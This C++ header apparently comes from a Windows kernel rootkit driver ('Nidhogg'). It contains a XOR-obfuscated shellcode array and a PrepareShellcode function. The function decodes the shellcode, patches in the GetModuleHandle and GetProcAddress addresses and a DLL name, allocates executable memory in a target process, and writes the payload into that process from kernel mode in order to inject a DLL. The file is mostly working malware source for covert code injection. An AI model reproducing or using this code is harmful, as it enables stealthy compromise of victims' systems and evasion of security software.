#pragma once
#include "pch.h"
#include "MemoryUtils.hpp"

constexpr SIZE_T SHELLCODE_SIZE = 0x19e;
constexpr SIZE_T XOR_KEY = 0x4d;
constexpr SIZE_T GET_MODULE_HANDLE_OFFSET = 0x2A;
constexpr SIZE_T GET_PROC_ADDRESS_OFFSET = 0x5E;
constexpr SIZE_T DLL_NAME_OFFSET = 0x8A;
constexpr SIZE_T SHELLCODE_ADDRESS_OFFSET = 0x72;
UCHAR shellcodeTemplate[] = { 0x18, 0x5, 0xc4, 0xa8, 0x5, 0xce, 0xa1, 0x1d, 0x5, 0xf5, 0x26, 0x28, 0x3f, 0x23, 0x28, 0x21, 0x7e, 0x7f, 0x5, 0xc4, 0x8, 0xae, 0x8a, 0x8, 0xa6, 0x63, 0x29, 0x21, 0x21, 0x8b, 0x8, 0xa2, 0x4d, 0x5, 0xc0, 0x8, 0xae, 0x5, 0xc4, 0x8c, 0x5, 0xf5, 0x5d, 0x5d, 0x5d, 0x5d, 0x5d, 0x5d, 0x5d, 0x5d, 0xb2, 0x9d, 0x5, 0xc4, 0x8, 0xb5, 0x5, 0xf5, 0x1, 0x22, 0x2c, 0x29, 0x1, 0x24, 0x2f, 0x3f, 0x5, 0xc4, 0x8, 0x9b, 0x8a, 0x8, 0x93, 0x2c, 0x3f, 0x34, 0xc, 0x8b, 0x8, 0xaf, 0x4d, 0x5, 0xc0, 0x18, 0x9b, 0x5, 0xc6, 0x8, 0xb5, 0x5, 0xc4, 0x8c, 0x5, 0xf5, 0x7c, 0x7c, 0x7c, 0x7c, 0x7c, 0x7c, 0x7c, 0x7c, 0xb2, 0x9d, 0x5, 0xc4, 0x8, 0xbd, 0x5, 0xc6, 0x8, 0xbd, 0x5, 0xf7, 0xc7, 0x5d, 0x4d, 0xd, 0x4c, 0x4d, 0x4d, 0x4d, 0x5, 0xc4, 0x9c, 0xb2, 0x9d, 0xf5, 0x4d, 0x4d, 0x4d, 0x4d, 0x5, 0xce, 0x89, 0x1d, 0x10, 0x8e, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0xc, 0x4d };


NTSTATUS PrepareShellcode(HANDLE hTargetProcess, PEPROCESS targetProcess, char* dllName, PVOID* shellcodeAddress) {
    SIZE_T shellcodeSize = SHELLCODE_SIZE;
    PVOID remoteAddress = NULL;
    NTSTATUS status = STATUS_SUCCESS;
    UCHAR newShellcode[SHELLCODE_SIZE]{};

    PVOID pGetProcAddress = NidhoggMemoryUtils->GetFuncAddress("GetProcAddress", L"\\Windows\\System32\\kernel32.dll");
    PVOID pGetModuleHandle = NidhoggMemoryUtils->GetFuncAddress("GetModuleHandle", L"\\Windows\\System32\\kernel32.dll");

    if (!dllName || !pGetProcAddress || !pGetModuleHandle)
        return STATUS_INVALID_PARAMETER;

    for (ULONG i = 0; i < SHELLCODE_SIZE; i++) {
        newShellcode[i] = shellcodeTemplate[i] ^ XOR_KEY;
    }

    memcpy(newShellcode + GET_MODULE_HANDLE_OFFSET, &pGetModuleHandle, sizeof(pGetModuleHandle));
    memcpy(newShellcode + GET_PROC_ADDRESS_OFFSET, &pGetProcAddress, sizeof(pGetProcAddress));
    memcpy(newShellcode + DLL_NAME_OFFSET, dllName, strlen(dllName) + 1);

    status = ZwAllocateVirtualMemory(hTargetProcess, &remoteAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

    if (!NT_SUCCESS(status))
        return status;
    shellcodeSize = SHELLCODE_SIZE;

    status = NidhoggMemoryUtils->KeWriteProcessMemory(&newShellcode, targetProcess, remoteAddress, shellcodeSize, KernelMode);

    if (!NT_SUCCESS(status)) {
        ZwFreeVirtualMemory(hTargetProcess, &remoteAddress, &shellcodeSize, MEM_DECOMMIT);
        return status;
    }
    shellcodeSize = SHELLCODE_SIZE;

    PVOID addr = (char*)remoteAddress + DLL_NAME_OFFSET;

    status = NidhoggMemoryUtils->KeWriteProcessMemory(&addr, targetProcess, (char*)remoteAddress + 
        SHELLCODE_ADDRESS_OFFSET, sizeof(PVOID), KernelMode);

    if (!NT_SUCCESS(status)) {
        ZwFreeVirtualMemory(hTargetProcess, &remoteAddress, &shellcodeSize, MEM_DECOMMIT);
        return status;
    }

    *shellcodeAddress = remoteAddress;
    return status;
}